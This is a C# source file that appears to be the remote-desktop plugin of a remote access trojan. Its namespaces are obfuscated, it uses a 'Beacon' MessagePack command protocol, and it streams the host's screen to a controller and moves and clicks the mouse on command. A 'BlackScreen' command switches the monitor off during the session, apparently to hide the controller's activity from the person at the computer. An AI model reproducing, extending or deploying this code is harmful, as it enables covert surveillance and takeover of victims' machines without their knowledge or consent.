using Beacon.MessagePackLib;
using cc.dw;
using cc.dw.cv;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;



namespace cc
{
    public static class Packet
    {
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, uint dwExtraInfo);

        public static bool IsOk { get; set; }
        public static bool Ishp { get; set; }
        public static void Read(BeaconMsgPack unpack_msgpack)
        {

            try
            {
                string type = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
                if (type == null) return;
                string CID = unpack_msgpack.ForcePathObject("CID").AsString;
                Console.WriteLine($"Plugin Information Read:{type}");

                switch (type)
                {
                    case "Heartbeat":                      // 心跳包
                        {
                            Plugin.RefreshHeartbeat();
                            break;
                        }
                    case "Start":                           //开始远程桌面
                        {
                            if (IsOk == true) return;
                            IsOk = true;
                            Console.WriteLine("Remote Desktop Started");
                            // 使用固定质量30，屏幕ID默认为0
                            CaptureAndSend(30, 0, CID);
                            break;
                        }
                    case "Stop":                            //停止远程桌面
                        {
                            IsOk = false;
                            Console.WriteLine("Remote Desktop Stopped");
                            Plugin.Destroy();
                            break;
                        }
                    case "MouseMove":
                        {
                            int x = (Int32)unpack_msgpack.ForcePathObject("X").AsInteger;
                            int y = (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger;
                            Point position = new Point(x, y);
                            Cursor.Position = position;
                            Console.WriteLine($"鼠标移动: X={x}, Y={y}");
                            break;
                        }
                    case "MouseEvent":                      //鼠标事件
                        {
                            int x = (Int32)unpack_msgpack.ForcePathObject("X").AsInteger;
                            int y = (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger;
                            int button = (Int32)unpack_msgpack.ForcePathObject("Button").AsInteger;
                            int action = (Int32)unpack_msgpack.ForcePathObject("Action").AsInteger;
                            
                            Console.WriteLine($"鼠标事件: X={x}, Y={y}, Button={button}, Action={action}");
                            
                            // 设置鼠标位置
                            Cursor.Position = new Point(x, y);
                            
                            // 模拟鼠标点击
                            if (action == 1) // 按下
                            {
                                if (button == 1) // 左键
                                {
                                    mouse_event(0x0002, 0, 0, 0, 0); // MOUSEEVENTF_LEFTDOWN
                                    Console.WriteLine("左键按下");
                                }
                                else if (button == 2) // 右键
                                {
                                    mouse_event(0x0008, 0, 0, 0, 0); // MOUSEEVENTF_RIGHTDOWN
                                    Console.WriteLine("右键按下");
                                }
                                else if (button == 4) // 中键
                                {
                                    mouse_event(0x0020, 0, 0, 0, 0); // MOUSEEVENTF_MIDDLEDOWN
                                    Console.WriteLine("中键按下");
                                }
                            }
                            else if (action == 2) // 释放
                            {
                                if (button == 1) // 左键
                                {
                                    mouse_event(0x0004, 0, 0, 0, 0); // MOUSEEVENTF_LEFTUP
                                    Console.WriteLine("左键释放");
                                }
                                else if (button == 2) // 右键
                                {
                                    mouse_event(0x0010, 0, 0, 0, 0); // MOUSEEVENTF_RIGHTUP
                                    Console.WriteLine("右键释放");
                                }
                                else if (button == 4) // 中键
                                {
                                    mouse_event(0x0040, 0, 0, 0, 0); // MOUSEEVENTF_MIDDLEUP
                                    Console.WriteLine("中键释放");
                                }
                            }
                            else if (action == 3) // 滚轮
                            {
                                if (button == 1) // 向上滚动
                                {
                                    mouse_event(0x0800, 0, 0, 120, 0); // MOUSEEVENTF_WHEEL, WHEEL_DELTA=120
                                    Console.WriteLine("滚轮向上");
                                }
                                else if (button == 2) // 向下滚动
                                {
                                    mouse_event(0x0800, 0, 0, unchecked((uint)-120), 0); // MOUSEEVENTF_WHEEL, WHEEL_DELTA=-120
                                    Console.WriteLine("滚轮向下");
                                }
                            }
                            break;
                        }
                    case "KeyboardEvent":                   //键盘事件
                        {
                            break;
                        }
                    case "Screen":                          //调整屏幕ID
                        {
                            int screenId = (Int32)unpack_msgpack.ForcePathObject("ScreenId").AsInteger;
                            Console.WriteLine($"切换屏幕ID: {screenId}");
                            // 这里可以添加屏幕切换逻辑
                            break;
                        }
                    case "BlackScreen":                     //黑屏开关
                        {
                            bool enableBlackScreen = unpack_msgpack.ForcePathObject("Enabled").AsInteger == 1;
                            Ishp = enableBlackScreen;
                            Console.WriteLine($"黑屏状态: {(enableBlackScreen ? "开启" : "关闭")}");
                            break;
                        }
                    case "RequestFirstFrame":               //请求第一帧完整图像
                        {
                            Console.WriteLine($"收到请求第一帧命令，CID: {CID}，发送完整图像");
                            // 强制发送第一帧完整图像
                            SendFirstFrame(CID);
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message, unpack_msgpack.ForcePathObject("CID").AsString);
                Plugin.Destroy();
            }
        }
        public static void Error(string ex, string CID)
        {
            BeaconMsgPack msgpack = new BeaconMsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("CID").AsString = CID;
            msgpack.ForcePathObject("Error").AsString = ex;
            Plugin.SendFramed(msgpack.Encode2Bytes());
        }

        public static void SendFirstFrame(string CID)
        {
            try
            {
                // 获取屏幕截图
                Bitmap bmp = GetScreen(0); // 使用第一个屏幕
                Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                Size size = new Size(bmp.Width, bmp.Height);
                BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                // 创建新的编码器实例，确保发送第一帧
                vf firstFrameCodec = new dw.cv.cc(60);
                
                using (MemoryStream stream = new MemoryStream())
                {
                    // 编码第一帧完整图像
                    firstFrameCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), 
                                           new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                    if (stream.Length > 0)
                    {
                        BeaconMsgPack msgpack = new BeaconMsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "RD";
                        msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                        msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                        msgpack.ForcePathObject("CID").AsString = CID;
                        Plugin.SendFramed(msgpack.Encode2Bytes());
                        Console.WriteLine($"发送第一帧完整图像: {stream.Length} 字节");
                    }
                }
                
                bmp.UnlockBits(bmpData);
                bmp.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"发送第一帧失败: {ex.Message}");
                Error(ex.Message, CID);
            }
        }

        [DllImport("user32.dll")]
        public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);


        public static void CaptureAndSend(int quality, int Scrn, string CID)
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Graphics graphics = null;
            Rectangle rect;
            Size size;
            BeaconMsgPack msgpack;
            vf unsafeCodec = new dw.cv.cc(quality);
            var stream = new MemoryStream(capacity: 1024 * 64);

            try
            {
                // 初始化一次位图/画布，循环复用，避免每帧分配
                var screenBounds = Screen.AllScreens[Scrn].Bounds;
                bmp = new Bitmap(screenBounds.Width, screenBounds.Height, PixelFormat.Format32bppArgb);
                graphics = Graphics.FromImage(bmp);

                while (IsOk)
                {
                    try
                    {
                        if (Ishp)
                        {
                            SendMessage(0xFFFF, 0x0112, 0xF170, 2);
                        }

                        // 捕获屏幕到复用位图
                        graphics.CopyFromScreen(screenBounds.Left, screenBounds.Top, 0, 0,
                            new Size(bmp.Width, bmp.Height), CopyPixelOperation.SourceCopy);

                        // 绘制光标（与 GetScreen 逻辑一致）
                        CURSORINFO pci;
                        pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
                        if (GetCursorInfo(out pci))
                        {
                            if (pci.flags == CURSOR_SHOWING)
                            {
                                DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                                graphics.ReleaseHdc();
                            }
                        }

                        rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                        size = new Size(bmp.Width, bmp.Height);
                        bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                        // 复用内存流
                        stream.Position = 0;
                        stream.SetLength(0);
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height),
                            new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            // 构造并发送（避免每帧启动新线程）
                            msgpack = new BeaconMsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "RD";
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            msgpack.ForcePathObject("CID").AsString = CID;
                            Plugin.SendFramed(msgpack.Encode2Bytes());
                        }

                        bmp.UnlockBits(bmpData);
                        bmpData = null;
                    }
                    catch
                    {
                        bmp?.UnlockBits(bmpData);
                        bmpData = null;
                        break;
                    }
                }
            }
            finally
            {
                try { bmp?.UnlockBits(bmpData); } catch { }
                graphics?.Dispose();
                bmp?.Dispose();
                stream?.Dispose();
            }
        }

        private static Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (Graphics graphics = Graphics.FromImage(bmpScreenshot))
                {
                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));
                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                    return bmpScreenshot;
                }
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }


        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        const Int32 CURSOR_SHOWING = 0x00000001;
    }
}
